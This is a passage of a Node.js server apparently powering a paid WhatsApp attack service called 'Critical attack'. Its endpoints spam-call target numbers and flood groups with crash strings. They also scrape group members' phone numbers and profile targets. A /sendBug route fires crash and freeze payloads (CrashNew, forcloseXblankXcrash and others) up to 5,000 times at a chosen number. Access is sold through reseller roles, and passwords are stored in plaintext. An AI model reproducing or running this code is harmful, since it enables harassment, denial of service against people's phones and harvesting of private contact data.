        return res.status(400).json({ success: false, message: "unsupported media type" });
    }

    const finalExt = ext || (isImage ? ".jpg" : ".m4a");
    const safeName = `${Date.now()}_${Math.random().toString(36).slice(2, 10)}${finalExt}`;
    const finalPath = path.join(CHATROOM_UPLOAD_DIR, safeName);

    try {
        fs.renameSync(req.file.path, finalPath);
    } catch {
        try { fs.copyFileSync(req.file.path, finalPath); } catch { }
        try { fs.unlinkSync(req.file.path); } catch { }
    }

    const relativeUrl = `/uploads/${safeName}`;
    const newData = appendChatroomMessage({
        from,
        type: isImage ? "image" : "audio",
        message,
        mediaUrl: buildAbsoluteUploadUrl(req, relativeUrl),
        mimeType,
        fileName: req.file.originalname || safeName,
        size: Number(req.file.size) || 0,
        duration: Number(req.body.duration) || 0,
        replyTo: parseReplyPayload(req.body.replyTo)
    });

    res.json({ success: true, data: newData });
});

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "partner", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);dulu
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});



app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[𝐂𝐫𝐢𝐭𝐢𝐜𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤" Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await DelayVisi(sock, groupJid);
          await newDelay(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function resolveKeyInfo(key) {
  if (!key) return null;
  let keyInfo = activeKeys[key];
  if (keyInfo) return keyInfo;

  const list = loadKeyList();
  const record = list.find(e => e.sessionKey === key);
  if (!record) return null;

  const created = new Date(record.lastLogin).getTime();
  keyInfo = {
    username: record.username,
    created,
    expires: created + 10 * 60 * 1000,
  };
  activeKeys[key] = keyInfo;
  return keyInfo;
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
    {
      image: "https://files.catbox.moe/wlf35a.jpg",
      title: "𝐂𝐫𝐢𝐭𝐢𝐜𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤",
      desc: "tunggu update selanjutnya"
    },
    {
      image: "https://files.catbox.moe/wlf35a.jpg",
      title: "𝐂𝐫𝐢𝐭𝐢𝐜𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤",
      desc: "WELCOME"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  telegramId: user.telegramId || "",
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    telegramId: user.telegramId || "",
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

const GLOBAL_SENDER_FOLDER = "__global__";
const GLOBAL_SENDER_TIMEZONE = "Asia/Jakarta";

function canManageGlobalSender(role = "member") {
  const normalizedRole = normalizeRoleName(role);
  return normalizedRole === "owner" || normalizedRole === "developer";
}

function getGlobalSenderDailyLimit(role = "member") {
  return null;
}

function canUseGlobalSender(role = "member") {
  return true;
}

function formatSenderQuotaDate(date = new Date()) {
  const parts = new Intl.DateTimeFormat("en-GB", {
    timeZone: GLOBAL_SENDER_TIMEZONE,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  }).formatToParts(date);

  const year = parts.find(part => part.type === "year")?.value || "0000";
  const month = parts.find(part => part.type === "month")?.value || "00";
  const day = parts.find(part => part.type === "day")?.value || "00";
  return `${year}-${month}-${day}`;
}

function ensureGlobalSenderUsageState(user) {
  const today = formatSenderQuotaDate();
  let changed = false;

  if (!user.globalSenderUsage || typeof user.globalSenderUsage !== "object") {
    user.globalSenderUsage = { date: today, count: 0 };
    return true;
  }

  if (user.globalSenderUsage.date !== today) {
    user.globalSenderUsage.date = today;
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  if (!Number.isFinite(user.globalSenderUsage.count) || user.globalSenderUsage.count < 0) {
    user.globalSenderUsage.count = 0;
    changed = true;
  }

  return changed;
}

function getGlobalSenderQuotaPayload(user) {
  ensureGlobalSenderUsageState(user);

  const normalizedRole = normalizeRoleName(user?.role || "member");
  const limit = getGlobalSenderDailyLimit(normalizedRole);
  const used = Number(user?.globalSenderUsage?.count || 0);
  const unlimited = limit === null;

  return {
    role: normalizedRole,
    canAdd: canManageGlobalSender(normalizedRole),
    canUse: canUseGlobalSender(normalizedRole),
    used,
    limit,
    remaining: unlimited ? null : Math.max(limit - used, 0),
    unlimited,
    date: user?.globalSenderUsage?.date || formatSenderQuotaDate(),
  };
}

function getGlobalSenderDeniedMessage(role = "member") {
  return `Role ${String(role).toUpperCase()} tidak diizinkan memakai Global Sender.`;
}

function getGlobalSenderLimitMessage(role = "member", quota = {}) {
  const limit = quota.limit ?? getGlobalSenderDailyLimit(role);
  const used = quota.used ?? 0;
  return `Limit Global Sender untuk role ${String(role).toUpperCase()} sudah habis (${used}/${limit}).`;
}

function consumeGlobalSenderQuota(user) {
  const quota = getGlobalSenderQuotaPayload(user);

  if (!quota.canUse) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderDeniedMessage(quota.role),
    };
  }

  if (!quota.unlimited && quota.used >= quota.limit) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderLimitMessage(quota.role, quota),
    };
  }

  if (!quota.unlimited) {
    user.globalSenderUsage.count = quota.used + 1;
  }

  return {
    ok: true,
    changed: !quota.unlimited,
    quota: getGlobalSenderQuotaPayload(user),
  };
}

function buildSessionCacheKey(folderNameOrPath = "", sessionName = "") {
  const folderName = path.basename(String(folderNameOrPath).replace(/[\\/]+$/, "")) || String(folderNameOrPath);
  return `${folderName}::${sessionName}`;
}

function buildSenderConnectionItem(sender, scope, role) {
  const sessionName = sender?.sessionName?.toString() || sender?.id?.toString() || "Unknown";
  const isGlobal = scope === "global";

  return {
    id: sender?.id?.toString() || sessionName,
    sessionName,
    scope,
    isGlobal,
    canDelete: isGlobal ? canManageGlobalSender(role) : true,
  };
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  const senderType = String(req.query.senderType || "private").trim().toLowerCase() === "global"
    ? "global"
    : "private";
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - Sender: ${senderType}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  let shouldSaveDatabase = ensureGlobalSenderUsageState(user);
  let globalSenderQuota = getGlobalSenderQuotaPayload(user);
  let selectedSession = null;

  if (senderType === "global") {
    if (!globalSenderQuota.canUse) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderDeniedMessage(user.role || "member"),
        globalSenderQuota,
      });
    }

    if (!globalSenderQuota.unlimited && globalSenderQuota.used >= globalSenderQuota.limit) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderLimitMessage(user.role || "member", globalSenderQuota),
        globalSenderQuota,
      });
    }

    selectedSession = checkActiveSessionInFolder(GLOBAL_SENDER_FOLDER);
    if (!selectedSession) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada Global Sender aktif saat ini.",
        globalSenderQuota,
      });
    }
  } else {
    selectedSession = checkActiveSessionInFolder(user.username);
    if (!selectedSession) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada sender pribadi aktif pada akun ini.",
        globalSenderQuota,
      });
    }
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    partner: 60,
    owner: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    if (shouldSaveDatabase) {
      saveDatabase(db);
    }
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      senderType,
      globalSenderQuota,
    });
  }

  if (senderType === "global") {
    const quotaResult = consumeGlobalSenderQuota(user);
    globalSenderQuota = quotaResult.quota;

    if (!quotaResult.ok) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: quotaResult.message,
        globalSenderQuota,
      });
    }

    shouldSaveDatabase = shouldSaveDatabase || quotaResult.changed;
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType,
    senderSession: selectedSession.sessionName,
    globalSenderQuota,
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const activeFolder = senderType === "global" ? GLOBAL_SENDER_FOLDER : user.username;
    const attemptSend = async (session, retry = false) => {
      try {
        const sock = session?.sock;
        if (!sock) {
          throw new Error("Sender session not available");
        }

        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "click":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await FyyTzyDelay(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "android":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await blank(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "invisible":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "ios_invis":
            for (let i = 0; i < 5000; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "ios_noinvis":
            for (let i = 0; i < 100; i++) {
              await DelayVisi(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await VisiBlanking(sock, targetJid);
              await DelayVisi(sock, targetJid);
              await newDelay(sock, targetJid);
              await BuldozerNoDelay(sock, targetJid);
              await CrashNew(sock, targetJid);
              await AlbumUi(sock, targetJid);
              await NullBlank(sock, targetJid);
              await MyFakePlasticLove(sock, targetJid);
              await ZyXNgaceng(sock, targetJid);
              await forcloseXblankXcrash(sock, targetJid);
              await sleep(1000);
            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (session?.cacheKey && err.message === 'Connection Closed') {
          delete activeConnections[session.cacheKey];
          delete biz[session.cacheKey];
          delete mess[session.cacheKey];
        }
        if (!retry) {
          const retrySession = await checkActiveSessionInFolder(activeFolder);
          if (retrySession) return await attemptSend(retrySession, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    if (!selectedSession?.sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(selectedSession);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    if (activeConnections[cacheKey]) {
      activeCreds.push({
          id: sessionName,
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

function removeSessionArtifacts(folderPath, sessionName) {
  const sessionFolder = path.join(folderPath, sessionName);
  const sessionFile = path.join(folderPath, `${sessionName}.json`);

  if (fs.existsSync(sessionFolder)) {
    fs.rmSync(sessionFolder, { recursive: true, force: true });
  }

  if (fs.existsSync(sessionFile)) {
    fs.rmSync(sessionFile, { force: true });
  }
}

const deletingSessions = new Set();

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('permenmd', user.username, number); 

  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  } else {
    return res.json({ valid: false, message: "Already registered" });
  }
  } catch (err) {
    console.error("Error in getPairing:", err.message);
    return res.status(500).json({ error: err.message });
  }
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role = "member" } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}' role '${role}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");
  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin membuat role '${role}'.`);
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (creatorRole === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: requestedRole,
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day} role ${requestedRole}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (owner/developer only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  const adminRole = normalizeRoleName(admin?.role || "member");
  if (!admin || !["owner", "developer"].includes(adminRole)) {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner/developer.`);
    return res.json({ valid: true, authorized: false, message: "Only owner or developer can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
    
    sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
    
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
